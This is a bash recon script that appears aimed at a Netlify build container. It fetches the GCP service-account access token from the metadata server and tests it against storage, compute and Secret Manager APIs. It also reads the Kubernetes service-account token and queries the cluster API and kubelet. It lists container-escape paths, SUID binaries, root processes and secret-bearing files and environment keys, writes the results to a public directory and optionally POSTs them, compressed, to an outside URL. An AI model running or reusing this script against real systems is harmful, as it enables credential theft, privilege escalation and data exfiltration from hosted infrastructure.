#!/usr/bin/env bash
# Netlify build-container recon — IN-SCOPE escalations (privesc/root, secrets-beyond-user,
# container escape, orchestration control-plane). Output is bounded and token-safe.
umask 077
mkdir -p public
OUT="public/_nfp_probe.txt"
exec > >(tee "$OUT") 2>&1
red(){ v="$1"; n=${#v}; [ "$n" -gt 0 ] && echo "<present len=$n>" || echo "<absent>"; }
echo "===== NETLIFY BUILD PROBE $(date -u) ====="
echo "## identity/kernel"; id; uname -a; head -2 /etc/os-release 2>/dev/null; echo "cwd=$(pwd)"
echo "## caps + ns + cgroup"; grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status; echo "self-ns:"; readlink /proc/self/ns/* 2>/dev/null|sort -u; echo "pid1-ns:"; readlink /proc/1/ns/* 2>/dev/null|sort -u; head -3 /proc/1/cgroup 2>/dev/null; head -3 /proc/self/cgroup 2>/dev/null
echo "## mounts (host/docker/k8s/secret hints)"; grep -iE 'docker|containerd|kube|secret|overlay|/dev/(vd|sd|nvme)|hostpath|gcs|csi' /proc/self/mountinfo 2>/dev/null|head -25
echo "## escape surface"; ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; echo "core_pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)"; ls -la /dev/mem 2>/dev/null
echo "## == GCP METADATA =="
H="Metadata-Flavor: Google"
M=""
for candidate in \
  "dns|http://metadata.google.internal/computeMetadata/v1" \
  "ipv4|http://169.254.169.254/computeMetadata/v1" \
  "alias|http://metadata.goog/computeMetadata/v1"; do
  label=${candidate%%|*}; root=${candidate#*|}
  code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' -H "$H" "$root/project/project-id" 2>/dev/null) || code=000
  echo "metadata-$label project_code=$code"
  if [ -z "$M" ] && [ "$code" = 200 ]; then M="$root"; fi
done
meta_get(){ curl --noproxy '*' -s -m6 -H "$H" "$1"; }
if [ -n "$M" ]; then
  PROJECT_ID=$(meta_get "$M/project/project-id")
  NUMERIC_PROJECT_ID=$(meta_get "$M/project/numeric-project-id")
  SA_EMAIL=$(meta_get "$M/instance/service-accounts/default/email")
else
  PROJECT_ID=""; NUMERIC_PROJECT_ID=""; SA_EMAIL=""
fi
echo "project: $(red "$PROJECT_ID")"
echo "numeric: $(red "$NUMERIC_PROJECT_ID")"
echo "sa-email: $(red "$SA_EMAIL")"
if [ -n "$M" ]; then echo "sa-scopes: $(curl --noproxy '*' -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "$H" "$M/instance/service-accounts/default/scopes" 2>/dev/null)"; else echo "sa-scopes: not-queried"; fi
TOKJSON=""; [ -n "$M" ] && TOKJSON=$(meta_get "$M/instance/service-accounts/default/token")
ATOK=$(echo "$TOKJSON" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
echo "sa-token: $(red "$ATOK") (redacted)"
if [ -n "$M" ]; then echo "instance-attrs: $(curl --noproxy '*' -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "$H" "$M/instance/attributes/?recursive=true" 2>/dev/null)"; else echo "instance-attrs: not-queried"; fi
echo "== USE SA token to test access (escalation) =="
if [ -n "$ATOK" ]; then
  echo "tokeninfo:"; curl -s -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' "https://oauth2.googleapis.com/tokeninfo?access_token=$ATOK"; echo
  echo "GCS list (project buckets):"; curl -s -m8 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $ATOK" "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID"; echo
  echo "GCE self:"; curl -s -m8 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $ATOK" "https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/zones"; echo
  echo "secret manager list:"; curl -s -m8 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $ATOK" "https://secretmanager.googleapis.com/v1/projects/$NUMERIC_PROJECT_ID/secrets"; echo
fi
echo "## == OTHER CLOUD METADATA (status only) =="
AWS_META="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
AZ_META="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
ECS_META="http://169.254.170.2/v2/metadata"
echo "aws-iam-role-code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' "$AWS_META" 2>/dev/null || echo 000)"
echo "azure-instance-code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' -H 'Metadata: true' "$AZ_META" 2>/dev/null || echo 000)"
echo "ecs-task-code=$(curl --noproxy '*' -s -m4 -o /dev/null -w '%{http_code}' "$ECS_META" 2>/dev/null || echo 000)"
echo "## == KUBERNETES =="
echo "kube-related environment keys:"; env | sed 's/=.*//' | grep -iE 'KUBERNETES|KUBE_' | head -30
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
KT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); echo "k8s-sa-token: $([ -n "$KT" ] && red "$KT" || echo none)"
echo "k8s-ns: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
KH=${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}
if [ -n "$KT" ]; then
  echo "whoami (SelfSubjectReview):"; curl -sk -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authentication.k8s.io/v1/selfsubjectreviews" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1; echo
  echo "can-i list secrets:"; curl -sk -m6 -o /dev/null -w 'http=%{http_code} bytes=%{size_download}' -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}' 2>&1; echo
fi
echo "kubelet :10250 pods:"; curl -sk -m4 "https://127.0.0.1:10250/pods" 2>&1 | head -c 100; echo
echo "## == BOUNDED WORKSPACE/CACHE METADATA =="
for D in /tmp /var/tmp /opt/buildhome /opt/build /opt/build/repo; do
  if [ -d "$D" ]; then
    files=$(find "$D" -xdev -maxdepth 3 -type f 2>/dev/null | wc -l)
    suspicious=$(find "$D" -xdev -maxdepth 3 -type f \( -iname '*secret*' -o -iname '*token*' -o -iname '*password*' -o -iname '*credential*' -o -iname '.env*' -o -iname '*id_rsa*' -o -iname '*npmrc*' \) 2>/dev/null | wc -l)
    world_readable=$(find "$D" -xdev -maxdepth 3 -type f -perm -004 2>/dev/null | wc -l)
    echo "dir=$D files=$files suspicious_names=$suspicious world_readable=$world_readable"
  fi
done
proc_uids=$(for P in /proc/[0-9]*; do awk '/^Uid:/{print $2; exit}' "$P/status" 2>/dev/null; done | sort | uniq -c | awk '{printf "%s:%s ",$2,$1}')
echo "process_uid_counts=${proc_uids:-none}"
SELF_PID_NS=$(readlink /proc/self/ns/pid 2>/dev/null || true)
PID1_PID_NS=$(readlink /proc/1/ns/pid 2>/dev/null || true)
echo "proc1_dir=$([ -d /proc/1 ] && echo present || echo absent) proc1_ns_dir=$([ -d /proc/1/ns ] && echo present || echo absent)"
echo "pid_ns_self=${SELF_PID_NS:-absent} pid_ns_pid1=${PID1_PID_NS:-absent} pid_ns_same=$([ -n "$SELF_PID_NS" ] && [ "$SELF_PID_NS" = "$PID1_PID_NS" ] && echo yes || echo no)"
root_same=0; root_other=0; root_nonzero_caps=0
root_other_same_mnt=0; root_other_same_user=0; root_other_same_rootfs=0; root_other_environ_readable=0
SELF_MNT_NS=$(readlink /proc/self/ns/mnt 2>/dev/null || true)
SELF_USER_NS=$(readlink /proc/self/ns/user 2>/dev/null || true)
SELF_ROOTFS=$(stat -Lc '%d:%i' / 2>/dev/null || true)
for P in /proc/[0-9]*; do
  uid=$(awk '/^Uid:/{print $2; exit}' "$P/status" 2>/dev/null)
  [ "$uid" = 0 ] || continue
  pns=$(readlink "$P/ns/pid" 2>/dev/null || true)
  if [ "$pns" = "$SELF_PID_NS" ]; then root_same=$((root_same+1)); else root_other=$((root_other+1)); fi
  cap=$(awk '/^CapEff:/{print $2; exit}' "$P/status" 2>/dev/null)
  [ -n "$cap" ] && [ "$cap" != "0000000000000000" ] && root_nonzero_caps=$((root_nonzero_caps+1))
  [ "$pns" = "$SELF_PID_NS" ] && continue
  [ "$(readlink "$P/ns/mnt" 2>/dev/null || true)" = "$SELF_MNT_NS" ] && root_other_same_mnt=$((root_other_same_mnt+1))
  [ "$(readlink "$P/ns/user" 2>/dev/null || true)" = "$SELF_USER_NS" ] && root_other_same_user=$((root_other_same_user+1))
  [ -r "$P/environ" ] && root_other_environ_readable=$((root_other_environ_readable+1))
  [ -n "$SELF_ROOTFS" ] && [ "$(stat -Lc '%d:%i' "$P/root" 2>/dev/null || true)" = "$SELF_ROOTFS" ] && root_other_same_rootfs=$((root_other_same_rootfs+1))
done
echo "root_process_counts=self_pidns:$root_same other_pidns:$root_other nonzero_cap_eff:$root_nonzero_caps"
echo "root_other_access=self_mntns:$root_other_same_mnt self_userns:$root_other_same_user self_rootfs:$root_other_same_rootfs environ_readable:$root_other_environ_readable"
echo "proc_hidepid=$(awk '$2==\"/proc\"{print ($4 ~ /hidepid/ ? $4 : \"none\"); exit}' /proc/mounts 2>/dev/null)"
echo "## == PRIVILEGED FILE METADATA =="
echo "no_new_privs=$(awk '/^NoNewPrivs:/{print $2; exit}' /proc/self/status 2>/dev/null) seccomp=$(awk '/^Seccomp:/{print $2; exit}' /proc/self/status 2>/dev/null)"
suid_count=0; sgid_count=0; root_privileged=0; known_privileged_names=""
for D in /bin /sbin /usr/bin /usr/sbin /opt/buildhome; do
  [ -d "$D" ] || continue
  mapfile -t priv_files < <(find "$D" -xdev -type f -perm /6000 2>/dev/null | sort -u)
  for F in "${priv_files[@]}"; do
    [ -f "$F" ] || continue
    mode=$(stat -Lc '%a' "$F" 2>/dev/null || true)
    owner=$(stat -Lc '%u' "$F" 2>/dev/null || true)
    case "$mode" in 4*|[567]*|[1357][0-7][0-7][0-7]) suid_count=$((suid_count+1));; esac
    case "$mode" in 2*|[2367]*|[1357][0-7][0-7][0-7]) sgid_count=$((sgid_count+1));; esac
    [ "$owner" = 0 ] && root_privileged=$((root_privileged+1))
    case "$(basename "$F")" in
      sudo|sudoedit|pkexec|doas|newuidmap|newgidmap|mount|umount|su|chsh|chfn|passwd|gpasswd|newgrp)
        known_privileged_names="$known_privileged_names $(basename "$F")";;
    esac
  done
done
echo "suid_sgid_files=$suid_count root_owned_privileged=$root_privileged known_tool_names=${known_privileged_names:-none}"
echo "## == SECRETS BEYOND MY USER =="
echo "matching environment keys (values omitted):"; env | sed 's/=.*//' | grep -iE 'secret|token|key|passw|cred|aws|gcp|_api' | sed 's/$/=<redacted>/' | head -30
if [ -f ~/.netrc ] || compgen -G '/opt/build*/.netrc' >/dev/null 2>&1; then echo "netrc: present (contents omitted)"; else echo "netrc: absent"; fi
if [ -f ~/.git-credentials ]; then echo "git creds: present (contents omitted)"; else echo "git creds: absent"; fi
echo "## network"; ip -o a 2>/dev/null|awk '{print $2,$4}'; grep -i nameserver /etc/resolv.conf 2>/dev/null
echo "===== END PROBE ====="

if [ -n "${NFP_OOB_URL:-}" ]; then
  gzip -c "$OUT" | base64 | tr -d '\n' | curl -sS -m15 -X POST -H 'Content-Type: text/plain' --data-binary @- "${NFP_OOB_URL%/}/" >/dev/null 2>&1 || true
fi
